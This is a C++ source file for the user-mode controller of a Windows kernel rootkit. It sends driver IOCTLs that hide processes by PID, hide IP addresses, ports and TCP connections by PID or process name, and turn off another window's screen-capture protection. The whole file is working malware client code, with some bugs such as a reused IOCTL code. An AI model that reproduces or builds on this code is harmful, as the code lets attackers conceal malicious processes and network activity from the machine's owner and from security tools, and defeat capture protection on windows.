#include "DriverHandler.h"
#include <string>
#include <assert.h>

bool logError(const char* message) 
{
    std::cerr << "ERROR: " << message << " errcode = " << GetLastError();
    return false;
}

bool logInfo(const char* message)
{
    std::cout << "INFO: " << message << std::endl;
    return true;
}

bool VerifyProcessIsRunning(_In_ const char* process_name)
{
	if (process_name == nullptr || strlen(process_name) == 0)
	{
		logError("Empty Process Name.\n");
		return false;
	}

	PWCHAR process{ new (std::nothrow) WCHAR[strlen(process_name) + 1] };
	if (process == nullptr)
	{
		logError("Memory allocation Failed\n");
		return false;
	}
	RtlZeroMemory(process, (strlen(process_name) + 1) * sizeof(WCHAR));
	
	int convertResult = MultiByteToWideChar(CP_UTF8, 0, process_name, (int)strlen(process_name), &process[0], (int)strlen(process_name));
	if (convertResult <= 0)
	{
		std::cerr << "Failed to convert to the Unicode String. Error:" << GetLastError() << std::endl;
		delete[] process;
		return false;
	}

	// Take a snapshot of all processes in the system.
	HANDLE hProcessSnap{ CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		logError("Failed: CreateToolhelp32Snapshot (of processes)\n");
		delete[] process;
		return(false);
	}

	// Set the size of the structure before using it.
	PROCESSENTRY32 pe32{};
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32))
	{
		logError("Failed to get the Process. Error: Process32First\n"); // show cause of failure
		CloseHandle(hProcessSnap);          // clean the snapshot object
		delete[] process;
		return(false);
	}

	// Now walk the snapshot of processes, and
	// verfify if we get the given process name.
	do
	{
		// Case insensitive (could use equivalent _stricmp)
		int result = _wcsicmp(pe32.szExeFile, &process[0]);
		if (result == 0)
		{
			assert(pe32.th32ProcessID);
			CloseHandle(hProcessSnap);          // clean the snapshot object
			delete[] process;
			return(true);
		}
		
	} while (Process32Next(hProcessSnap, &pe32));
	CloseHandle(hProcessSnap);
	delete[] process;

	return(false);
}

Driver::DriverHandler::DriverHandler()
{
	device_handle_ = CreateFile(
		Driver::DeviceName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		nullptr,
		OPEN_EXISTING,
		0,
		nullptr
	);
}

Driver::DriverHandler::~DriverHandler()
{
	if (device_handle_ != INVALID_HANDLE_VALUE)
	{
		CloseHandle(device_handle_);
	}	
}


BOOL Driver::DriverHandler::check_connection(char* message)
{
	char ReadBuffer[Driver::TestConnectionMaxLength] = { 0 };
	DWORD returned;
	BOOL bRet = DeviceIoControl(
		device_handle_,
		static_cast<DWORD>(Driver::RookitIoctls::TestConnection),
		message,
		(DWORD)strlen(message),
		ReadBuffer,
		sizeof(ReadBuffer),
		&returned,
		nullptr
	);

	if (bRet)
	{
		std::cout << "Message received from kerneland : " << ReadBuffer << std::endl;
	}
	else
	{
		logError("Connection Test Failed.");
	}

	return bRet;
}

BOOL Driver::DriverHandler::hide_ip(const char* message)
{
	IN_ADDR IpAddressBinary{};
	PCSTR Term{};
	NTSTATUS status = RtlIpv4StringToAddressA(message, TRUE, &Term, &IpAddressBinary);
	if (!NT_SUCCESS(status))
	{
		logError("Could not parse ipv4 address\n");
		return false;
	}

	NETHOOK_HIDDEN_CONNECTION HiddenConnection = { 0 };
	HiddenConnection.IpAddress = IpAddressBinary.s_addr;

	DWORD BytesReturned{ 0 };
	BOOL bRet = DeviceIoControl(
		device_handle_,
		static_cast<DWORD>(Driver::RookitIoctls::HideIP),
		&HiddenConnection,
		sizeof(NETHOOK_HIDDEN_CONNECTION),
		nullptr,
		0,
		&BytesReturned,
		nullptr
	);
	return bRet;
}

BOOL Driver::DriverHandler::hide_port(const char* message)
{
	USHORT port_number{ 0 };
	std::stringstream ss(message);
	if (ss >> port_number)
	{
		char* port = const_cast<char*>(message);
		DWORD BytesReturned{ 0 };

		BOOL bRet = DeviceIoControl(
			device_handle_,
			static_cast<DWORD>(Driver::RookitIoctls::HidePort),
			port,
			(DWORD)strlen(port),
			nullptr,
			0,
			&BytesReturned,
			nullptr
		);
		return bRet;
	}
	logError("Port number is not a valid Integer type");
	return FALSE;
}

BOOL Driver::DriverHandler::hide_remote_ip(const char* message)
{
	IN_ADDR IpAddressBinary{};
	PCSTR Term{};
	NTSTATUS status = RtlIpv4StringToAddressA(message, TRUE, &Term, &IpAddressBinary);
	if (!NT_SUCCESS(status))
	{
		logError("Could not parse ipv4 address\n");
		return false;
	}

	NETHOOK_HIDDEN_CONNECTION HiddenConnection = { 0 };
	HiddenConnection.RemoteIpAddress = IpAddressBinary.s_addr;

	DWORD BytesReturned{ 0 };
	BOOL bRet = DeviceIoControl(
		device_handle_,
		static_cast<DWORD>(Driver::RookitIoctls::HideRemoteIP),
		&HiddenConnection,
		sizeof(NETHOOK_HIDDEN_CONNECTION),
		nullptr,
		0,
		&BytesReturned,
		nullptr
	);
	return bRet;
}


BOOL Driver::DriverHandler::hide_connect_pid(const char* message)
{
	USHORT pid_number{ 0 };
	std::stringstream ss(message);
	if (ss >> pid_number)
	{
		char* pid = const_cast<char*>(message);
		DWORD BytesReturned{ 0 };

		BOOL bRet = DeviceIoControl(
			device_handle_,
			static_cast<DWORD>(Driver::RookitIoctls::HideConnectProcessId),
			pid,
			(DWORD)strlen(pid),
			nullptr,
			0,
			&BytesReturned,
			nullptr
		);
		return bRet;
	}
	logError("PID  is not a valid Integer type");
	return FALSE;
}

BOOL Driver::DriverHandler::hide_connect_process(const char* message)
{	
	if (VerifyProcessIsRunning(message))
	{
		char* process_name = const_cast<char*>(message);
		if (process_name == nullptr)
		{
			return FALSE;
		}
		DWORD BytesReturned{ 0 };
		BOOL bRet = DeviceIoControl(
			device_handle_,
			static_cast<DWORD>(Driver::RookitIoctls::HideConnectProcessName),
			process_name,
			(DWORD)strlen(process_name),
			nullptr,
			0,
			&BytesReturned,
			nullptr
		);
		return bRet;
	}
	logError("Process Name entry not found in the process list\n");
	return FALSE;
}

BOOL Driver::DriverHandler::hide_pid(const char* message)
{
	USHORT pid_number{ 0 };
	std::stringstream ss(message);
	if (ss >> pid_number)
	{
		char* pid = const_cast<char*>(message);
		DWORD BytesReturned{ 0 };

		BOOL bRet = DeviceIoControl(
			device_handle_,
			static_cast<DWORD>(Driver::RookitIoctls::HideProcessId),
			pid,
			(DWORD)strlen(pid),
			nullptr,
			0,
			&BytesReturned,
			nullptr
		);
		return bRet;
	}
	logError("PID  is not a valid Integer type");
	return FALSE;
}

HWND FindTopWindow(DWORD pid)
{
	std::pair<HWND, DWORD> params = { 0, pid };

	// Enumerate the windows using a lambda to process each window
	BOOL bResult = EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL
		{
			auto pParams = (std::pair<HWND, DWORD>*)(lParam);

			DWORD processId;
			if (GetWindowThreadProcessId(hwnd, &processId) && processId == pParams->second && GetWindow(hwnd, GW_OWNER) == 0)
			{
				// Stop enumerating
				SetLastError((DWORD)-1);
				pParams->first = hwnd;
				return FALSE;
			}

			// Continue enumerating
			return TRUE;
		}, (LPARAM)&params);

	if (!bResult && GetLastError() == -1 && params.first)
	{
		return params.first;
	}
	return 0;
}

BOOL Driver::DriverHandler::disable_window_capture_protect(const char* message)
{
	DWORD pid_number{ 0 };
	std::stringstream ss(message);
	if (ss >> pid_number)
	{
		HWND windowHandle = FindTopWindow(pid_number);
		if (windowHandle == 0)
		{
			logError("Unable to determine Window Handle for the PID.");
			return FALSE;
		}

		if ((GetWindowLong(windowHandle, GWL_STYLE) & WS_VISIBLE) == WS_VISIBLE)
		{
			DWORD dwAffinity{0};
			BOOL bRet = GetWindowDisplayAffinity(windowHandle, &dwAffinity);
			if (bRet && dwAffinity != WDA_NONE) 
			{
				DWORD BytesReturned{ 0 };
				typedef struct _protect_sprite_content
				{
					uint32_t value;
					uint64_t window_handle;
				} protect_sprite_content, * pprotect_sprite_content;
				protect_sprite_content req = { 0 };

				req.window_handle = reinterpret_cast<uint64_t>(windowHandle);
				req.value = WDA_NONE;

				bRet = DeviceIoControl(
					device_handle_,
					static_cast<DWORD>(Driver::RookitIoctls::HideProcessId),
					&req,
					(DWORD)sizeof(req),
					nullptr,
					0,
					&BytesReturned,
					nullptr
				);
				return bRet;
			}
			return TRUE;
		}

		logError("Window Handle not visible for the PID.");
		return FALSE;
	}

	logError("PID  is not a valid Integer type");
	return FALSE;
}

HANDLE Driver::DriverHandler::device_handle()
{
	return device_handle_;
}

int Driver::DriverHandler::CmdCheckConnection(int argc, const char** argv)
{
	if (argc < 3)
	{
		std::cerr << "Missing Parameters For check-connection (<message>)" << std::endl;
		std::cerr << "[+] Enter a message you would like to send to the kernel" << std::endl;
		return -1;
	}

	char* message = const_cast<char*>(argv[2]);
	if ((message != nullptr) && (!check_connection(message)))
	{
		logError("Problem asserting connection with driver\n");
		return -1;
	}
	else
	{
		logInfo("Connected! message echoed successfully");
	}
	return 0;
}

int Driver::DriverHandler::CmdNetHideIp(int argc, const char** argv)
{
	if (argc < 3)
	{
		logError("Missing Parameters For hide-ip (<ip>)\n");
	}

	const char* ip = argv[2];
	if ((ip != nullptr) && (!hide_ip(ip)))
	{
		logError("Couldn't hide IP");
	}
	else
	{
		logInfo("IP Hidden!");
	}
	return 0;
}

int Driver::DriverHandler::CmdNetHidePort(int argc, const char** argv)
{
	if (argc < 3)
	{
		logError("Missing Parameters For hide-port (<port-number>)\n");
	}

	const char* port_number = argv[2];
	if ((port_number != nullptr) && (!hide_port(port_number)))
	{
		logError("Couldn't hide port");
	}
	else
	{
		logInfo("Port Hidden!");
	}

	return 0;
}

int Driver::DriverHandler::CmdNetHideRemoteIp(int argc, const char** argv)
{
	if (argc < 3)
	{
		logError("Missing Parameters For hide-remote-ip (<ip>)\n");
	}

	const char* foreign_ip = argv[2];
	if ((foreign_ip != nullptr) && (!hide_remote_ip(foreign_ip)))
	{
		logError("Couldn't hide Remote IP");
	}
	else
	{
		logInfo("Remote IP Hidden!");
	}
	return 0;
}

int Driver::DriverHandler::CmdNetHideConnectPID(int argc, const char** argv)
{
	if (argc < 3)
	{
		logError("Missing Parameters For hide-connect-pid (<pid>)\n");
	}

	const char* connect_pid = argv[2];
	if ((connect_pid != nullptr) && (!hide_connect_pid(connect_pid)))
	{
		logError("Couldn't hide Connect PID");
	}
	else
	{
		logInfo("Connect PID is Hidden!");
	}
	return 0;
}

int Driver::DriverHandler::CmdNetHideConnectProcessName(int argc, const char** argv)
{
	if (argc < 3)
	{
		logError("Missing Parameters For hide-connect-process (<process name>)\n");
	}

	const char* connect_process = argv[2];
	if ((connect_process != nullptr) && (!hide_connect_process(connect_process)))
	{
		logError("Couldn't hide TCP connection by Process Name\n");
	}
	else
	{
		logInfo("TCP connection by Process is Hidden!\n");
	}
	return 0;
}

int Driver::DriverHandler::CmdNetHidePID(int argc, const char** argv)
{
	if (argc < 3)
	{
		logError("Missing Parameters For hide-pid (<pid>)\n");
	}

	const char* pid = argv[2];
	if ((pid != nullptr) && (!hide_pid(pid)))
	{
		logError("Couldn't hide PID");
	}
	else
	{
		logInfo("PID is Hidden!");
	}
	return 0;
}

int Driver::DriverHandler::CmdDisableWindowCaptureProtect(int argc, const char** argv)
{
	if (argc < 3)
	{
		logError("Missing Parameters For disable-window-capture (<pid>)\n");
	}

	const char* pid = argv[2];
	if ((pid != nullptr) && (!disable_window_capture_protect(pid)))
	{
		logError("Couldn't disable window capture protect for the given PID");
	}
	else
	{
		logInfo("Window Capture Protect is Disabled!");
	}
	return 0;
}